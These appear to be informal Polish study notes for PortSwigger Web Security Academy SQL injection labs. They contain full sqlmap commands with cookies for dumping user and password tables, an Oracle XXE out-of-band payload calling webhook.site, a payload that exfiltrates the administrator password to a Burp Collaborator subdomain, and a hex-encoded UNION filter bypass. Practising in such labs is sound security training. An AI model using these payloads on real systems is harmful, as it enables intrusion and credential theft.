Flagi:
--fingerprint (for dmbs detection)
–dbs (bazy danych, lepiej tego używać niż schema)
-D public → wybór bazy
-T users_odmlik → wybór tabeli
--dump → pobranie danych
--level (1–5) → ILE miejsc i technik sqlmap testuje (level=1 tylko oczywiste parametry (np. category, level=2 dodatkowe parametry, np. cookies (TrackingId ← ważne u Ciebie, level=5 wszystko, łącznie z rzadkimi nagłówkami i egzotycznymi payloadami)
--risk (1–3) → JAK agresywne payloady są używane (risk=1 bezpieczne AND 1=1, proste warunki, risk=3
 ciężkie UNION, SUBSELECT, SLEEP, BENCHMARK)
--threads=10    czyli sqlmap wali 10 requestów naraz → nonstop → bez przerw
- throttling (celowe spowalnianie lub ograniczanie liczby żądań, które serwer akceptuje od jednego klienta w danym czasie.) - Serwer PortSwigger mówi: "OK, stop. Spowalniam / ignoruję część requestów"
- rate limitong - server blokuje klienta po x requestach
- AND must be type boolean czyli AND CAST zamieniam ma AND 1=CAST
https://portswigger.net/web-security/sql-injection/cheat-sheet

5. SQL injection attack, listing the database contents on non-Oracle databases

Database engine detection:

sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch  




--schema (enumerates database schema (databases, tables, columns)) 
Lepiej zacząć od --dbs, a --schema używać rzadko

sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch --dbms=PostgreSQL --schema



User and Passowrd table display

sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch --dbms=PostgreSQL -D public -T users_odmlik --dump











11. Blind SQL injection with conditional errors

sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10


sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B --users

sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B -D Peter --tables

sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B -D Peter -T USERS --dump




___

--schema w Oracle + blind SQLi
To jest najgorsza możliwa kombinacja:
Oracle nie ma „baz danych” jak MySQL


ma SCHEMATY (users): SYS, SYSTEM, APP, itd.
___
flaga –users
 Wylistowania użytkowników bazy danych (DBMS users)

___
SYS, SYSTEM → systemowe (ignorujemy)


CTXSYS, XDB, MDSYS, OUTLN → systemowe


APEX_*, FLOWS_FILES → Oracle APEX


HR → schemat przykładowy Oracle


PETER → 👀 najbardziej podejrzany

____
12. Visible error-based SQL injection 
trzeba czytac errory w response
zaczac od ‘ nastepnie ‘--




13. Blind SQL injection with time delays

fingerprint database system

sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \                     
  --level=2 --risk=1 \
  --batch --threads=10 --fingerprint


sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --dump


Database: public
Table: users
[3 entries]
+---------+----------+----------+
| !mail   | password | username |
+---------+----------+----------+
| <blank> | <blank>  | <blank>  |
| <blank> | <blank>  | <blank>  |
| <blank> | <blank>  | <blank>  |
+---------+----------+----------+



sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'"



zebay zaliczyc, trzeba  opoznic atak o 10 sekund

sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'" --technique=T --time-sec=10
14. Blind SQL injection with time delays and information retrieval

tip: w time-based usunac watki bo opoznienia sie mieszkaja

Ważne doprecyzowanie (PostgreSQL)
W PostgreSQL:
nie ma „baz danych” w tym sensie co w MySQL


sqlmap używa pojęcia database, ale technicznie:


public = schema


users, tracking = tabele w schemacie public



ta komenda nie zadziałała:
sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTiBYuPxs1v11IY; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId 


sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTiBYuPxs1v11IY; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5

sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTiBYuPxs1v11IY; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5 --dbms=PostgreSQL –dump










15. Blind SQL injection with out-of-band interaction

tip: out of band beda z uzyciem kolaboratora


burp pro

GET /filter?category=Gifts HTTP/2
Host: 0af1006c03847b7680fa038600540016.web-security-academy.net
Cookie: TrackingId=fspJHklzpGupi3MM'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"https%3a//webhook.site/aaeb8254-b290-426e-9985-d900d53473e2">+%25remote%3b]>'),'/l')+FROM+dual--
; session=a8c8mvvuugvboadppmgjrc19dwd1o4tw: 


payload stad:
https://portswigger.net/web-security/sql-injection/cheat-sheet








16. Blind SQL injection with out-of-band data exfiltration
payload

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--




17. SQL injection with filter bypass via XML encoding

dopisalam w url stockid

/product?productId=1&stockId=London 



nasteonie mam request w proxy

POST /product/stock HTTP/2

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>




payload

<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>


payload w hex

&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;


















